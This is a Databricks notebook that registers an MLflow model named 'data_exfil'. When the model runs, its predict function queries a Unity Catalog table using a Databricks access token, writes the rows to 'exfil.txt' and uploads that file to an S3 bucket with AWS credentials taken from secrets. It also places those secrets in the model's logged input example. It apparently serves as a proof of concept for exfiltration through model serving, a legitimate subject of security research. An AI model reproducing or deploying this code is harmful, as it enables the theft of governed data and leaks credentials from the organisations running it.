# Databricks notebook source
from pyspark.errors import PySparkException
import mlflow
mlflow.set_registry_uri("databricks-uc")

# COMMAND ----------

!pip install boto3
!pip install "databricks-sql-connector[sqlalchemy]"
dbutils.library.restartPython()

# COMMAND ----------

import logging
from botocore.exceptions import ClientError
import os
import boto3


def upload_file(file_name, bucket, aws_key, aws_secret, aws_session, object_name=None):
    """Upload a file to an S3 bucket

    :param file_name: File to upload
    :param bucket: Bucket to upload to
    :param object_name: S3 object name. If not specified then file_name is used
    :return: True if file was uploaded, else False
    """

    # If S3 object_name was not specified, use file_name
    if object_name is None:
        object_name = os.path.basename(file_name)

    # Upload the file

    s3_client = boto3.client(
        's3',
        aws_access_key_id = aws_key,
        aws_secret_access_key= aws_secret,
        aws_session_token= aws_session
    )
    try:
        response = s3_client.upload_file(file_name, bucket, object_name)
    except ClientError as e:
        logging.error(e)
        return False
    return True

# COMMAND ----------

aws_key = dbutils.secrets.get(scope="aws", key="key")
aws_secret = dbutils.secrets.get(scope="aws", key="secret")
aws_session = dbutils.secrets.get(scope="aws", key="session")
pat = dbutils.secrets.get(scope="databricks", key="pat")

# COMMAND ----------

from databricks import sql
from typing import List

def predict(model_input: List[str]) -> List[str]:
    
    def create_table(file_name, bucket, host, http_path, aws_key, aws_secret, aws_session, pat):
        
        with sql.connect(server_hostname = host,
                        http_path       = http_path,
                        access_token    = pat) as connection:

            with connection.cursor() as cursor:
                cursor.execute("SELECT * FROM aso_fe_catalog.default.trips LIMIT 2")
                result = cursor.fetchall()

                file_path = './exfil.txt'

                # Open the file in write mode
                with open(file_path, 'w') as file:

                    for row in result:
                        print(row)

                        # Write data to the file
                        file.write(str(row))

        result = upload_file(file_name, bucket, aws_key, aws_secret, aws_session)
        return str(result)

    result = create_table(model_input[0], model_input[1], model_input[2], model_input[3], model_input[4], model_input[5], model_input[6], model_input[7])
    return [result]

with mlflow.start_run():
    model_info = mlflow.pyfunc.log_model(
        artifact_path="model",
        python_model=predict,
        input_example=["./exfil.txt", "aso-uc-metastore", "adb-7861826065021443.3.azuredatabricks.net", "/sql/1.0/warehouses/0a41b89d48d596c0", aws_key, aws_secret, aws_session, pat],
        registered_model_name="aso_fe_catalog.default.data_exfil"
    )
